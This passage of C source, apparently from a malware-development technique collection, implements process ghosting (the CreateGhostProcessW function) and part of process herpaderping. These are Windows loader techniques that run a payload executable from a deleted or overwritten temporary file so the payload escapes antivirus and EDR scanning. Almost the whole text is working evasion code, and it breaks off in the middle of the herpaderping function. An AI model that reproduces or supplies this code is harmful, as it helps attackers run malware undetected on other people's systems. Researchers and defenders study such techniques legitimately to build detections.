		if (!NT_SUCCESS((STATUS = g_NtApi.pNtWriteVirtualMemory(hProcess, (LPVOID)(pUserProcParms->Environment), (LPVOID)pUserProcParms->Environment, pUserProcParms->EnvironmentSize, &sNumberOfBytesWritten)))) {
			printf("[!] NtWriteVirtualMemory [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
			printf("[i] Wrote %d Of %d Bytes \n", sNumberOfBytesWritten, pUserProcParms->EnvironmentSize);
			goto _END_OF_FUNC;
		}
	}

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtWriteVirtualMemory(hProcess, &ProcInfo.PebBaseAddress->ProcessParameters, &pUserProcParms, sizeof(PVOID), &sNumberOfBytesWritten)))) {
		printf("[!] NtWriteVirtualMemory [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		printf("[i] Wrote %d Of %d Bytes \n", sNumberOfBytesWritten, sizeof(PVOID));
		goto _END_OF_FUNC;
	}

	bResult = TRUE;

_END_OF_FUNC:
	if (pwcDuplicateStr)
		free(pwcDuplicateStr);
	if (pwcDuplicateStr2)
		free(pwcDuplicateStr2);
	*ppImageBase = Peb.ImageBase;
	memset(&Peb, 0x00, sizeof(PEB));
	memset(pUserProcParms, 0x00, sizeof(RTL_USER_PROCESS_PARAMETERS));
	return (*ppImageBase && bResult) ? TRUE : FALSE;
}

// =========================================================================================================================================================

BOOL CreateGhostProcessW(IN LPWSTR szLegitWindowsPeWithArgs, IN ULONG_PTR uPePayloadBuffer, IN SIZE_T sPePayloadSize, OUT LPPROCESS_INFORMATION lpProcessInformation) {

	BOOL							bResult							= FALSE;
	NTSTATUS						STATUS							= STATUS_SUCCESS;
	PVOID							pImgBaseAddress					= NULL,
									pEntryPntAddress				= NULL;
	PIMAGE_NT_HEADERS				pImgNtHdrs						= NULL;
	UNICODE_STRING					usFileName						= { 0 };
	OBJECT_ATTRIBUTES				ObjectAttr						= { 0 };
	IO_STATUS_BLOCK					StatusBlock						= { 0 };
	FILE_DISPOSITION_INFORMATION	FileDispInfo					= { .DeleteFileW = TRUE };
	LARGE_INTEGER					ByteOffset						= { 0 };
	WCHAR							szTmpPath[MAX_PATH]				= { 0 };
	WCHAR							szTmpFilePath[MAX_PATH]			= { 0 };
	WCHAR							szTmpFileNtPath[MAX_PATH * 2]	= { 0 };
	HANDLE							hTmpFileHandle					= NULL,
									hGhostSection					= NULL;

	if (!szLegitWindowsPeWithArgs || !uPePayloadBuffer || !sPePayloadSize || !lpProcessInformation)
		return FALSE;

	if (!InitializeSyscallsStruct())
		return FALSE;

	if (GetTempPathW(MAX_PATH, szTmpPath) == 0x00) {
		printf("[!] GetTempPathW Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	if (GetTempFileNameW(szTmpPath, L"PG", 0x00, szTmpFilePath) == 0x00) {
		printf("[!] GetTempFileNameW Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	wsprintfW(szTmpFileNtPath, L"\\??\\%s", szTmpFilePath);

	printf("[i] Created Tmp Path: %ws \n", szTmpFileNtPath);

	RtlInitUnicodeString(&usFileName, szTmpFileNtPath);
	InitializeObjectAttributes(&ObjectAttr, &usFileName, OBJ_CASE_INSENSITIVE, NULL, NULL);

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtOpenFile(&hTmpFileHandle, (DELETE | SYNCHRONIZE | GENERIC_READ | GENERIC_WRITE), &ObjectAttr, &StatusBlock, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_SUPERSEDE | FILE_SYNCHRONOUS_IO_NONALERT)))) {
		printf("[!] NtOpenFile Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	printf("[+] Fetched Tmp File Handle: 0x%0.8X \n", hTmpFileHandle);

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtSetInformationFile(hTmpFileHandle, &StatusBlock, &FileDispInfo, sizeof(FILE_DISPOSITION_INFORMATION), FileDispositionInformation)))) {
		printf("[!] NtSetInformationFile Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtWriteFile(hTmpFileHandle, NULL, NULL, NULL, &StatusBlock, uPePayloadBuffer, sPePayloadSize, &ByteOffset, NULL)))) {
		printf("[!] NtWriteFile Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	printf("[i] Wrote Pe Payload To Tmp File \n");

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtCreateSection(&hGhostSection, SECTION_ALL_ACCESS, NULL, 0x00, PAGE_READONLY, SEC_IMAGE, hTmpFileHandle))) || !hGhostSection) {
		printf("[!] NtCreateSection Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	printf("[+] Created Ghost Section: 0x%0.8X \n", hGhostSection);

	DELETE_HANDLE(hTmpFileHandle);

	printf("[i] Deleted Tmp File From The Disk\n");

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtCreateProcessEx(&lpProcessInformation->hProcess, PROCESS_ALL_ACCESS, NULL, NtCurrentProcess(), PS_INHERIT_HANDLES, hGhostSection, NULL, NULL, FALSE)))) {
		printf("[!] NtCreateProcessEx Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	lpProcessInformation->dwProcessId = GetProcessId(lpProcessInformation->hProcess);
	printf("[*] Created Ghost Process With PID: %d \n", lpProcessInformation->dwProcessId);

	printf("[i] Initializing Process Parms ... \n");
	if (!InitializeProcessParms(lpProcessInformation->hProcess, szLegitWindowsPeWithArgs, &pImgBaseAddress))
		goto _END_OF_FUNC;

	pImgNtHdrs = (PIMAGE_NT_HEADERS)(uPePayloadBuffer + ((PIMAGE_DOS_HEADER)uPePayloadBuffer)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		goto _END_OF_FUNC;

	pEntryPntAddress = (ULONG_PTR)pImgBaseAddress + pImgNtHdrs->OptionalHeader.AddressOfEntryPoint;

	printf("[+] Ghost Process Entry Point: 0x%p \n", pEntryPntAddress);

	if (!NT_SUCCESS(g_NtApi.pNtCreateThreadEx(&lpProcessInformation->hThread, THREAD_ALL_ACCESS, NULL, lpProcessInformation->hProcess, pEntryPntAddress, NULL, 0x00, 0x00, 0x00, 0x00, NULL))) {
		printf("[!] NtCreateThreadEx Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	lpProcessInformation->dwThreadId = GetThreadId(lpProcessInformation->hThread);
	printf("[*] Created Ghost Process Thread With ID: %d \n", lpProcessInformation->dwThreadId);

	bResult = TRUE;

_END_OF_FUNC:
	DELETE_HANDLE(hTmpFileHandle);
	DELETE_HANDLE(hGhostSection);
	return bResult;
}
```
### Process Herpaderping
```c
#include <windows.h>
#include <stdio.h>
#include <userenv.h>
#include "Structs.h"

#pragma comment(lib, "Userenv.lib")


typedef NTSTATUS(NTAPI* fnNtCreateFile)(
	OUT  PHANDLE            FileHandle,
	IN   ACCESS_MASK        DesiredAccess,
	IN   POBJECT_ATTRIBUTES ObjectAttributes,
	OUT  PIO_STATUS_BLOCK   IoStatusBlock,
	IN	 PLARGE_INTEGER     AllocationSize		OPTIONAL,
	IN   ULONG              FileAttributes,
	IN   ULONG              ShareAccess,
	IN   ULONG              CreateDisposition,
	IN   ULONG              CreateOptions,
	IN   PVOID              EaBuffer,
	IN   ULONG              EaLength
	);


typedef NTSTATUS(NTAPI* fnNtWriteFile)(
	HANDLE           FileHandle,
	HANDLE           Event,
	PIO_APC_ROUTINE  ApcRoutine,
	PVOID            ApcContext,
	PIO_STATUS_BLOCK IoStatusBlock,
	PVOID            Buffer,
	ULONG            Length,
	PLARGE_INTEGER   ByteOffset,
	PULONG           Key
	);

typedef NTSTATUS(NTAPI* fnNtReadFile)(
	HANDLE				FileHandle,
	HANDLE				Event,
	PIO_APC_ROUTINE		ApcRoutine,
	PVOID				ApcContext,
	PIO_STATUS_BLOCK	IoStatusBlock,
	PVOID				Buffer,
	ULONG				Length,
	PLARGE_INTEGER		ByteOffset,
	PULONG				Key
);

typedef NTSTATUS(NTAPI* fnNtSetInformationFile)(
	HANDLE                 FileHandle,
	PIO_STATUS_BLOCK       IoStatusBlock,
	PVOID                  FileInformation,
	ULONG                  Length,
	FILE_INFORMATION_CLASS FileInformationClass
	);

typedef NTSTATUS(NTAPI* fnNtFlushBuffersFile)(
	HANDLE           FileHandle,
	PIO_STATUS_BLOCK IoStatusBlock
	);

typedef NTSTATUS(NTAPI* fnNtCreateSection)(
	PHANDLE					SectionHandle,
	ACCESS_MASK				DesiredAccess,
	POBJECT_ATTRIBUTES		ObjectAttributes,
	PLARGE_INTEGER			MaximumSize,
	ULONG					SectionPageProtection,
	ULONG					AllocationAttributes,
	HANDLE					FileHandle
	);

typedef NTSTATUS(NTAPI* fnNtReadVirtualMemory)(
	HANDLE          ProcessHandle,
	PVOID           BaseAddress,
	PVOID           Buffer,
	ULONG           NumberOfBytesToRead,
	PULONG          NumberOfBytesRead
	);

typedef NTSTATUS(NTAPI* fnRtlCreateProcessParametersEx)(
	PRTL_USER_PROCESS_PARAMETERS* pProcessParameters,
	PUNICODE_STRING                 ImagePathName,
	PUNICODE_STRING                 DllPath,
	PUNICODE_STRING                 CurrentDirectory,
	PUNICODE_STRING                 CommandLine,
	PVOID                           Environment,
	PUNICODE_STRING                 WindowTitle,
	PUNICODE_STRING                 DesktopInfo,
	PUNICODE_STRING                 ShellInfo,
	PUNICODE_STRING                 RuntimeData,
	ULONG                           Flags
	);

typedef NTSTATUS(NTAPI* fnNtAllocateVirtualMemory)(
	HANDLE		ProcessHandle,
	PVOID*		BaseAddress,
	ULONG_PTR	ZeroBits,
	PSIZE_T		RegionSize,
	ULONG		AllocationType,
	ULONG		Protect
	);

typedef NTSTATUS(NTAPI* fnNtWriteVirtualMemory)(
	HANDLE        ProcessHandle,
	PVOID         BaseAddress,
	PVOID         Buffer,
	SIZE_T        NumberOfBytesToWrite,
	PSIZE_T		  NumberOfBytesWritten
	);

typedef NTSTATUS(NTAPI* fnNtCreateProcessEx)(
	PHANDLE				ProcessHandle,
	ACCESS_MASK			DesiredAccess,
	POBJECT_ATTRIBUTES	ObjectAttributes,
	HANDLE				ParentProcess,
	ULONG				Flags,
	HANDLE				SectionHandle,
	HANDLE				DebugPort,
	HANDLE				ExceptionPort,
	BOOLEAN				InJob
	);

typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)(
	HANDLE           ProcessHandle,
	PROCESSINFOCLASS ProcessInformationClass,
	PVOID            ProcessInformation,
	ULONG            ProcessInformationLength,
	PULONG           ReturnLength
	);

typedef NTSTATUS(NTAPI* fnNtCreateThreadEx)(
	PHANDLE                 ThreadHandle,
	ACCESS_MASK             DesiredAccess,
	POBJECT_ATTRIBUTES      ObjectAttributes,
	HANDLE                  ProcessHandle,
	PVOID                   StartRoutine,
	PVOID                   Argument,
	ULONG                   CreateFlags,
	SIZE_T                  ZeroBits,
	SIZE_T                  StackSize,
	SIZE_T                  MaximumStackSize,
	PPS_ATTRIBUTE_LIST      AttributeList
	);


// ---------------------------------------------------------------------------------------------------------------------------------------------------------
// ---------------------------------------------------------------------------------------------------------------------------------------------------------
// ---------------------------------------------------------------------------------------------------------------------------------------------------------


typedef struct _NT_API_FP
{

	fnNtCreateFile					pNtCreateFile;
	fnNtCreateSection				pNtCreateSection;
	fnNtWriteFile					pNtWriteFile;
	fnNtReadFile					pNtReadFile;
	fnNtSetInformationFile			pNtSetInformationFile;
	fnNtFlushBuffersFile			pNtFlushBuffersFile;
	fnNtCreateProcessEx				pNtCreateProcessEx;
	fnNtAllocateVirtualMemory		pNtAllocateVirtualMemory;
	fnNtWriteVirtualMemory			pNtWriteVirtualMemory;
	fnRtlCreateProcessParametersEx	pRtlCreateProcessParametersEx;
	fnNtQueryInformationProcess		pNtQueryInformationProcess;
	fnNtReadVirtualMemory			pNtReadVirtualMemory;
	fnNtCreateThreadEx				pNtCreateThreadEx;

} NT_API_FP, * PNT_API_FP;

// ---------------------------------------------------------------------------------------------------------------------------------------------------------

#define DELETE_HANDLE(H)								\
	if (H != NULL && H != INVALID_HANDLE_VALUE){		\
		CloseHandle(H);									\
		H = NULL;										\
	}

// ---------------------------------------------------------------------------------------------------------------------------------------------------------

NT_API_FP	g_NtApi = { 0x00 };

// =========================================================================================================================================================
// =========================================================================================================================================================

BOOL InitializeSyscallsStruct() {

	HMODULE		hNtdll = NULL;

	if (!(hNtdll = GetModuleHandle(TEXT("NTDLL")))) {
		printf("[!] GetModuleHandle Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	g_NtApi.pNtCreateFile					= (fnNtCreateFile)GetProcAddress(hNtdll, "NtCreateFile");
	g_NtApi.pNtAllocateVirtualMemory		= (fnNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
	g_NtApi.pNtWriteVirtualMemory			= (fnNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
	g_NtApi.pNtWriteFile					= (fnNtWriteFile)GetProcAddress(hNtdll, "NtWriteFile");
	g_NtApi.pNtReadFile						= (fnNtReadFile)GetProcAddress(hNtdll, "NtReadFile");
	g_NtApi.pNtSetInformationFile			= (fnNtSetInformationFile)GetProcAddress(hNtdll, "NtSetInformationFile");
	g_NtApi.pNtFlushBuffersFile				= (fnNtFlushBuffersFile)GetProcAddress(hNtdll, "NtFlushBuffersFile");
	g_NtApi.pNtCreateSection				= (fnNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
	g_NtApi.pRtlCreateProcessParametersEx	= (fnRtlCreateProcessParametersEx)GetProcAddress(hNtdll, "RtlCreateProcessParametersEx");
	g_NtApi.pNtCreateProcessEx				= (fnNtCreateProcessEx)GetProcAddress(hNtdll, "NtCreateProcessEx");
	g_NtApi.pNtQueryInformationProcess		= (fnNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
	g_NtApi.pNtCreateThreadEx				= (fnNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
	g_NtApi.pNtReadVirtualMemory			= (fnNtReadVirtualMemory)GetProcAddress(hNtdll, "NtReadVirtualMemory");

	if (!g_NtApi.pNtAllocateVirtualMemory	||	!g_NtApi.pNtReadFile				||	!g_NtApi.pNtWriteVirtualMemory			|| !g_NtApi.pNtSetInformationFile	||
		!g_NtApi.pNtWriteFile				||	!g_NtApi.pNtCreateSection			||	 !g_NtApi.pRtlCreateProcessParametersEx || !g_NtApi.pNtFlushBuffersFile		||
		!g_NtApi.pNtCreateProcessEx			||	!g_NtApi.pNtQueryInformationProcess ||	!g_NtApi.pNtCreateThreadEx				|| !g_NtApi.pNtReadVirtualMemory	||
		!g_NtApi.pNtCreateFile)
	{
		return FALSE;
	}

	return TRUE;
}


// =========================================================================================================================================================

VOID RtlInitUnicodeString(OUT PUNICODE_STRING UsStruct, IN OPTIONAL PCWSTR Buffer) {

	if ((UsStruct->Buffer = (PWSTR)Buffer)) {

		unsigned int Length = wcslen(Buffer) * sizeof(WCHAR);
		if (Length > 0xfffc)
			Length = 0xfffc;

		UsStruct->Length = Length;
		UsStruct->MaximumLength = UsStruct->Length + sizeof(WCHAR);
	}

	else UsStruct->Length = UsStruct->MaximumLength = 0;
}

// =========================================================================================================================================================

BOOL InitializeProcessParms(IN HANDLE hProcess, IN LPWSTR szLegitWindowsPeWithArgs, OUT PVOID* ppImageBase) {

	BOOL							bResult							= FALSE;
	NTSTATUS						STATUS							= STATUS_SUCCESS;
	UNICODE_STRING					UsCommandLine					= { 0 },
									UsNtImagePath					= { 0 },
									UsCurrentDirectory				= { 0 };
	PRTL_USER_PROCESS_PARAMETERS	pUserProcParms					= { 0 };
	PVOID							pEnvironment					= NULL;
	PWCHAR							pwcDuplicateStr					= NULL,
									pwcDuplicateStr2				= NULL,
									pwcExe							= NULL,
									pwcLastSlash					= NULL;
	PEB								Peb								= { 0 };
	PROCESS_BASIC_INFORMATION		ProcInfo						= { 0 };
	ULONG_PTR						uUserEnvAndParmsBaseAddress		= NULL,
									uUserEnvAndParmsEndAddress		= NULL;
	SIZE_T							sUserEnvAndParmsSize			= NULL,
									sNumberOfBytesWritten			= NULL;
	PVOID							pTmpPntrAddress					= NULL;

	/*
		* szLegitWindowsPeWithArgs	 -	L"C:\\Windows\\system32\\RuntimeBroker.exe coffee"		(UNICODE_STRING UsCommandLine)
		* pwcDuplicateStr			-	L"C:\\Windows\\system32"								(UNICODE_STRING UsCurrentDirectory)
		* pwcDuplicateStr2			-	L"C:\\Windows\\system32\\RuntimeBroker.exe"				(UNICODE_STRING UsNtImagePath)
	*/

	if (!(pwcDuplicateStr = _wcsdup(szLegitWindowsPeWithArgs)))
		goto _END_OF_FUNC;
	if (pwcLastSlash = wcsrchr(pwcDuplicateStr, L'\\'))
		*pwcLastSlash = L'\0';

	if (!(pwcDuplicateStr2 = _wcsdup(szLegitWindowsPeWithArgs)))
		goto _END_OF_FUNC;
	if (pwcExe = wcsstr(pwcDuplicateStr2, L".exe"))
		*(pwcExe + sizeof(".exe")) = L'\0';


	if (!CreateEnvironmentBlock(&pEnvironment, NULL, TRUE)) {
		printf("[!] CreateEnvironmentBlock Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	RtlInitUnicodeString(&UsCommandLine, szLegitWindowsPeWithArgs);
	RtlInitUnicodeString(&UsCurrentDirectory, pwcDuplicateStr);
	RtlInitUnicodeString(&UsNtImagePath, pwcDuplicateStr2);

	if (!NT_SUCCESS((STATUS = g_NtApi.pRtlCreateProcessParametersEx(&pUserProcParms, &UsNtImagePath, NULL, &UsCurrentDirectory, &UsCommandLine, pEnvironment, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED)))) {
		printf("[!] RtlCreateProcessParametersEx Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtQueryInformationProcess(hProcess, ProcessBasicInformation, &ProcInfo, sizeof(PROCESS_BASIC_INFORMATION), NULL)))) {
		printf("[!] NtQueryInformationProcess Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtReadVirtualMemory(hProcess, ProcInfo.PebBaseAddress, &Peb, sizeof(PEB), NULL)))) {
		printf("[!] NtReadVirtualMemory Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	printf("[i] Ghost Process PEB Address: 0x%p \n", ProcInfo.PebBaseAddress);
	printf("[i] Ghost Process Image Address: 0x%p \n", Peb.ImageBase);

	uUserEnvAndParmsBaseAddress = pUserProcParms;
	uUserEnvAndParmsEndAddress	= (ULONG_PTR)pUserProcParms + pUserProcParms->Length;

	if (pUserProcParms->Environment) {

		if ((ULONG_PTR)pUserProcParms > (ULONG_PTR)pUserProcParms->Environment)
			uUserEnvAndParmsBaseAddress = (PVOID)pUserProcParms->Environment;

		if ((ULONG_PTR)pUserProcParms->Environment + pUserProcParms->EnvironmentSize > uUserEnvAndParmsEndAddress)
			uUserEnvAndParmsEndAddress = (ULONG_PTR)pUserProcParms->Environment + pUserProcParms->EnvironmentSize;
	}

	sUserEnvAndParmsSize	= uUserEnvAndParmsEndAddress - uUserEnvAndParmsBaseAddress;
	pTmpPntrAddress			= pUserProcParms;

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtAllocateVirtualMemory(hProcess, &pTmpPntrAddress, 0x00, &sUserEnvAndParmsSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))) {
		printf("[!] NtAllocateVirtualMemory Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtWriteVirtualMemory(hProcess, pUserProcParms, pUserProcParms, pUserProcParms->Length, &sNumberOfBytesWritten)))) {
		printf("[!] NtWriteVirtualMemory [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		printf("[i] Wrote %d Of %d Bytes \n", sNumberOfBytesWritten, pUserProcParms->Length);
		goto _END_OF_FUNC;
	}

	if (pUserProcParms->Environment) {

		if (!NT_SUCCESS((STATUS = g_NtApi.pNtWriteVirtualMemory(hProcess, (LPVOID)(pUserProcParms->Environment), (LPVOID)pUserProcParms->Environment, pUserProcParms->EnvironmentSize, &sNumberOfBytesWritten)))) {
			printf("[!] NtWriteVirtualMemory [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
			printf("[i] Wrote %d Of %d Bytes \n", sNumberOfBytesWritten, pUserProcParms->EnvironmentSize);
			goto _END_OF_FUNC;
		}
	}

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtWriteVirtualMemory(hProcess, &ProcInfo.PebBaseAddress->ProcessParameters, &pUserProcParms, sizeof(PVOID), &sNumberOfBytesWritten)))) {
		printf("[!] NtWriteVirtualMemory [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		printf("[i] Wrote %d Of %d Bytes \n", sNumberOfBytesWritten, sizeof(PVOID));
		goto _END_OF_FUNC;
	}

	bResult = TRUE;

_END_OF_FUNC:
	if (pwcDuplicateStr)
		free(pwcDuplicateStr);
	if (pwcDuplicateStr2)
		free(pwcDuplicateStr2);
	*ppImageBase = Peb.ImageBase;
	memset(&Peb, 0x00, sizeof(PEB));
	memset(pUserProcParms, 0x00, sizeof(RTL_USER_PROCESS_PARAMETERS));
	return (*ppImageBase && bResult) ? TRUE : FALSE;
}

// =========================================================================================================================================================

BOOL OverWriteTheTmpFile(IN OPTIONAL HANDLE hSourceFile, IN OPTIONAL PBYTE pSourceBuffer, IN OPTIONAL DWORD dwSourceBufferSize, IN HANDLE hDistenationFile, IN BOOL bOverWriteByHandle) {

	BOOL							bResult					= FALSE;
	NTSTATUS						STATUS					= STATUS_SUCCESS;
	LARGE_INTEGER					ByteOffset				= { 0 };
	IO_STATUS_BLOCK					StatusBlock				= { 0 };
	DWORD							dwPeFileSize			= dwSourceBufferSize;
	PBYTE							pPeFileBuffer			= pSourceBuffer;
	FILE_POSITION_INFORMATION		FilePosInfo				= { 0 };
	FILE_END_OF_FILE_INFORMATION	FileEndInfo				= { 0 };


	if (!hDistenationFile || hDistenationFile == INVALID_HANDLE_VALUE)
		return FALSE;

	if ((bOverWriteByHandle && !hSourceFile) || (bOverWriteByHandle && hSourceFile == INVALID_HANDLE_VALUE))
		return FALSE;

	if ((!bOverWriteByHandle && !pSourceBuffer) || (!bOverWriteByHandle && !dwSourceBufferSize))
		return FALSE;

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtSetInformationFile(hDistenationFile, &StatusBlock, &FilePosInfo, sizeof(FILE_POSITION_INFORMATION), FilePositionInformation)))) {
		printf("[!] NtSetInformationFile [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		goto _END_OF_FUNC;
	}

	if (bOverWriteByHandle) {

		if ((dwPeFileSize = GetFileSize(hSourceFile, NULL)) == INVALID_FILE_SIZE) {
			printf("[!] GetFileSize Failed With Error: %d \n", GetLastError());
			goto _END_OF_FUNC;
		}

		if (!(pPeFileBuffer = LocalAlloc(LPTR, (SIZE_T)dwPeFileSize))) {
			printf("[!] LocalAlloc Failed With Error: %d \n", GetLastError());
			goto _END_OF_FUNC;
		}

		if (!NT_SUCCESS((STATUS = g_NtApi.pNtSetInformationFile(hSourceFile, &StatusBlock, &FilePosInfo, sizeof(FILE_POSITION_INFORMATION), FilePositionInformation)))) {
			printf("[!] NtSetInformationFile [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
			goto _END_OF_FUNC;
		}

		if (!NT_SUCCESS((STATUS = g_NtApi.pNtReadFile(hSourceFile, NULL, NULL, NULL, &StatusBlock, pPeFileBuffer, dwPeFileSize, &ByteOffset, NULL)))) {
			printf("[!] NtReadFile Failed With Error: 0x%0.8X \n", STATUS);
			goto _END_OF_FUNC;
		}
	}

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtWriteFile(hDistenationFile, NULL, NULL, NULL, &StatusBlock, pPeFileBuffer, dwPeFileSize, &ByteOffset, NULL)))) {
		printf("[!] NtWriteFile Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtFlushBuffersFile(hDistenationFile, &StatusBlock)))) {
		printf("[!] NtFlushBuffersFile Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	FileEndInfo.EndOfFile.QuadPart = dwPeFileSize;

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtSetInformationFile(hDistenationFile, &StatusBlock, &FileEndInfo, sizeof(FILE_END_OF_FILE_INFORMATION), FileEndOfFileInformation)))) {
		printf("[!] NtSetInformationFile [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		goto _END_OF_FUNC;
	}

	bResult = TRUE;

_END_OF_FUNC:
	if (pPeFileBuffer && bOverWriteByHandle)
		LocalFree(pPeFileBuffer);
	return bResult;
}


// =========================================================================================================================================================

BOOL CreateHerpaderpProcess(IN LPWSTR szLegitWindowsPe, IN LPWSTR szPePayloadArgs, IN ULONG_PTR uPePayloadBuffer, IN SIZE_T sPePayloadSize, OUT LPPROCESS_INFORMATION lpProcessInformation) {

	BOOL					bResult							= FALSE;
	NTSTATUS				STATUS							= STATUS_SUCCESS;
	PVOID					pImgBaseAddress					= NULL,
							pEntryPntAddress				= NULL;
	PIMAGE_NT_HEADERS		pImgNtHdrs						= NULL;
	UNICODE_STRING			usFileName						= { 0 };
	OBJECT_ATTRIBUTES		FileObjectAttr					= { 0 };
	IO_STATUS_BLOCK			IOStatusBlock					= { 0 };
	HANDLE					hTmpPeFile						= NULL,
							hLegitPeFile					= NULL,
							hSection						= NULL;
	WCHAR					szTmpPath[MAX_PATH]				= { 0 };
	WCHAR					szTmpFilePath[MAX_PATH]			= { 0 };
	WCHAR					szFileNtPath[MAX_PATH * 2]		= { 0 };

	if (!szLegitWindowsPe || !uPePayloadBuffer || !sPePayloadSize || !lpProcessInformation)
		return FALSE;

	if (!InitializeSyscallsStruct())
		return FALSE;

	if (GetTempPathW(MAX_PATH, szTmpPath) == 0x00) {
		printf("[!] GetTempPathW Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (GetTempFileNameW(szTmpPath, L"PH", 0x00, szTmpFilePath) == 0x00) {
		printf("[!] GetTempFileNameW Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	wsprintfW(szFileNtPath, L"\\??\\\\%s", szTmpFilePath);
	printf("[i] Created Tmp Nt Path: %ws \n", szFileNtPath);
	RtlInitUnicodeString(&usFileName, szFileNtPath);
	InitializeObjectAttributes(&FileObjectAttr, &usFileName, OBJ_CASE_INSENSITIVE, NULL, NULL);

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtCreateFile(&hTmpPeFile, (FILE_GENERIC_READ | FILE_GENERIC_WRITE), &FileObjectAttr, &IOStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, (FILE_SHARE_READ | FILE_SHARE_WRITE), FILE_OPEN, FILE_RANDOM_ACCESS, NULL, 0x00))) || !hTmpPeFile) {
		printf("[!] NtCreateFile [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		goto _END_OF_FUNC;
	}

	wsprintfW(szFileNtPath, L"\\??\\\\%s", szLegitWindowsPe);
	printf("[i] Legit Windows Image Nt Path: %ws \n", szFileNtPath);
	RtlInitUnicodeString(&usFileName, szFileNtPath);
	InitializeObjectAttributes(&FileObjectAttr, &usFileName, OBJ_CASE_INSENSITIVE, NULL, NULL);

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtCreateFile(&hLegitPeFile, FILE_GENERIC_READ, &FileObjectAttr, &IOStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN, FILE_RANDOM_ACCESS, NULL, 0x00))) || !hLegitPeFile) {
		printf("[!] NtCreateFile [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		goto _END_OF_FUNC;
	}

	if (!OverWriteTheTmpFile(NULL, uPePayloadBuffer, sPePayloadSize, hTmpPeFile, FALSE))
		goto _END_OF_FUNC;

	printf("[+] Wrote The Payload File To The Created Temporary File \n");

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0x00, PAGE_READONLY, SEC_IMAGE, hTmpPeFile))) || !hSection) {
		printf("[!] NtCreateSection Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	printf("[i] Created A Section Of The Temporary File: 0x%0.8X \n", hSection);

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtCreateProcessEx(&lpProcessInformation->hProcess, PROCESS_ALL_ACCESS, NULL, NtCurrentProcess(), PS_INHERIT_HANDLES, hSection, NULL, NULL, FALSE)))) {
		printf("[!] NtCreateProcessEx Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	DELETE_HANDLE(hSection);

	lpProcessInformation->dwProcessId = GetProcessId(lpProcessInformation->hProcess);
	printf("[*] Created Herpaderping Process With PID: %d \n", lpProcessInformation->dwProcessId);

	if (!OverWriteTheTmpFile(hLegitPeFile, NULL, 0x00, hTmpPeFile, TRUE))
		goto _END_OF_FUNC;

	DELETE_HANDLE(hTmpPeFile);
	DELETE_HANDLE(hLegitPeFile);

	printf("[i] Overwrote The Temporary File With The Legitmate Windows Image\n");

	printf("[i] Initializing Process Parms ... \n");
	memset(szFileNtPath, 0x00, MAX_PATH);
